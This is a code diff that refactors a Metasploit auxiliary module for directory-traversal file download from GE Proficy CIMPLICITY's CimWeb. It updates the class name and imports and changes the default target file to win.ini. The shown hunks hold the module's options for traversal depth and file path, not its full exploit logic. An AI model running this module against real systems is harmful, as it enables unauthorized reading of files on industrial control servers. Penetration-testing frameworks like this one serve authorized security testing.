@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'uri'
-require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Report
 
@@ -38,10 +36,10 @@ class Metasploit3 < Msf::Auxiliary
       [
         Opt::RPORT(80),
         OptString.new('TARGETURI',[true, 'Path to CimWeb', '/CimWeb']),
-        OptString.new('FILEPATH', [true, 'The name of the file to download', '/boot.ini']),
+        OptString.new('FILEPATH', [true, 'The name of the file to download', '/windows\\win.ini']),
         # By default gefebt.exe installed on C:\Program Files\GE Fanuc\Proficy CIMPLICITY\WebPages\CimWeb
         OptInt.new('DEPTH', [true, 'Traversal depth', 5])
-      ], self.class)
+      ])
   end
 
   def normalize_uri(*strs)
@@ -139,5 +137,4 @@ class Metasploit3 < Msf::Auxiliary
     print_good("#{rhost}:#{rport} - File saved in: #{path}")
 
   end
-
 end
